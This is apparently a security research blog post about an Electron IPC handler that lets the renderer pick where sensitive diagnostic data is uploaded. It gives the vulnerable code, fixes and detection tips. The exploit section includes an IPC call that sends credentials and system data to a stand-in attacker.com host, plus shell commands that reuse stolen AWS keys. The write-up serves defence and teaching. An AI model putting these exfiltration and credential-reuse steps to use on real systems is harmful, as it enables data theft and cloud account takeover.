---
title: "Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints"
description: "An Electron application's IPC handler accepted attacker-controlled destination URLs from the renderer process, enabling full credential and system data exfiltration to arbitrary external endpoints via a single IPC message."
date: 2026-06-13
author: "w4nn4d13"
category: "Security Research"
tags:
  - electron
  - ipc
  - ssrf
  - application-security
hashtags:
  - "#Electron"
  - "#SecurityResearch"
  - "#SSRF"
  - "#AppSec"
draft: false
toc: true
---

## What Is This Bug?

Electron apps are split into two parts:

- **Renderer** — the UI layer (like a browser tab). Limited permissions. Untrusted.
- **Main Process** — the engine. Full OS access. Can read files, run commands, make network requests.

They communicate via IPC (Inter-Process Communication).

**The bug:** The main process let the renderer decide where to send sensitive data — with zero validation.

## The Vulnerable Code

```javascript
// ❌ INSECURE — main.js
ipcMain.handle('upload-diagnostics', async (event, params) => {

    const destination = params.destination; // ← Comes from renderer. Never validated.

    const data = {
        environment: process.env,            // API keys, secrets, tokens
        networkInterfaces: os.networkInterfaces(),
        processList: execSync('ps aux').toString(),
        systemLogs: execSync('journalctl -n 100').toString(),
    };

    await uploadArchive(data, destination); // Sends everything to attacker's URL
});
```

One line. That's the entire bug.

## Severity

| Field | Value |
|---|---|
| **CVSS Score** | 9.1 (Critical) |
| **Attack Vector** | Network (via XSS) |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Impact** | Full credential / data exfiltration |

**CWEs:** CWE-918 (SSRF), CWE-441 (Unintended Proxy), CWE-20 (Input Validation), CWE-284 (Access Control)

## How an Attacker Exploits It

### Step 1 — Get JS into the Renderer

| Method | How |
|---|---|
| XSS | App renders unsanitised HTML from the internet |
| Supply chain | A compromised npm package runs code on import |
| MitM | App loads resources over HTTP; attacker injects a script |
| Malicious webview | App opens external URLs with Node.js enabled |

### Step 2 — Send One IPC Message

```javascript
const { ipcRenderer } = require('electron');

ipcRenderer.invoke('upload-diagnostics', {
    destination: 'https://attacker.com/collect'
});
```

### Step 3 — Receive a ZIP With

```
stolen_data/
├── environment_vars.json   ← AWS keys, GitHub tokens, DB passwords
├── network_interfaces.json ← IPs, MACs, VPN info
├── process_list.txt        ← All running processes
├── system_logs.txt         ← Auth events, errors, activity
└── user_info.json          ← Username, home dir, shell
```

### Step 4 — Escalate

```bash
export AWS_ACCESS_KEY_ID=$(cat environment_vars.json | jq -r '.AWS_ACCESS_KEY_ID')
export AWS_SECRET_ACCESS_KEY=$(cat environment_vars.json | jq -r '.AWS_SECRET_ACCESS_KEY')
aws s3 ls  # Full cloud access
```

## Why This Is Hard to Detect

The data leaves from a trusted, legitimate app — not malware. Firewalls and EDR tools see:

```
[Slack / Discord / VS Code] → HTTPS POST → attacker.com
```

Not a suspicious unknown process. Detection is significantly harder.

## The Fix

### Fix 1 — Hardcode the Destination (Most Important)

```javascript
// ✅ SECURE — renderer has zero control over where data goes
const ENDPOINT = 'https://diagnostics.yourcompany.com/upload';

ipcMain.handle('upload-diagnostics', async (event) => {
    const data = await collectDiagnosticData();
    await uploadData(data, ENDPOINT); // Always the hardcoded URL
    return { success: true };
});
```

### Fix 2 — Validate the Sender

```javascript
ipcMain.handle('upload-diagnostics', async (event, params) => {
    const senderURL = event.senderFrame.url;

    if (!senderURL.startsWith('file:///')) {
        throw new Error('Rejected: untrusted IPC sender');
    }
    // ...
});
```

### Fix 3 — Use contextBridge

```javascript
// preload.js — expose only what the renderer needs, nothing more
const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('electronAPI', {
    uploadDiagnostics: () => ipcRenderer.invoke('upload-diagnostics'),
    // No URL parameter exposed — renderer can't pass one
});
```

### Fix 4 — Secure Window Settings

```javascript
new BrowserWindow({
    webPreferences: {
        contextIsolation: true,   // ✅ Mandatory
        nodeIntegration: false,   // ✅ Mandatory
        sandbox: true,            // ✅ Recommended
        preload: path.join(__dirname, 'preload.js'),
    }
});
```

### Fix 5 — Content Security Policy

```javascript
'Content-Security-Policy': "default-src 'self' file:; script-src 'self' file:; object-src 'none'"
```

## Reconnaissance (For Authorised Testing)

### Find IPC Channel Names

```bash
npm install -g asar
asar extract app.asar ./src/
grep -r "ipcMain.handle\|ipcMain.on" ./src/ --include="*.js"
```

### Monitor IPC Traffic via DevTools

```javascript
const orig = ipcRenderer.invoke.bind(ipcRenderer);
ipcRenderer.invoke = function(channel, ...args) {
    console.log('[IPC]', channel, JSON.stringify(args));
    return orig(channel, ...args);
};
```

### Detection Indicators

```bash
# Suspicious temp files
find /tmp -name "diagnostics_*.zip"

# Monitor outbound connections
pid=$(pgrep -f "your-electron-app")
ss -tp | grep $pid
```

## Key Takeaways

- Never let the renderer control where privileged data goes. It doesn't need to know.
- Every IPC handler is a potential attack surface. Validate sender + params.
- `contextIsolation: true` + `nodeIntegration: false` are not optional — they're baseline.
- A compromised renderer should have limited blast radius. If it doesn't, the architecture is wrong.
- Security is a design decision, not an afterthought.

---

*For authorised security testing only. Always obtain written permission before testing any application.*
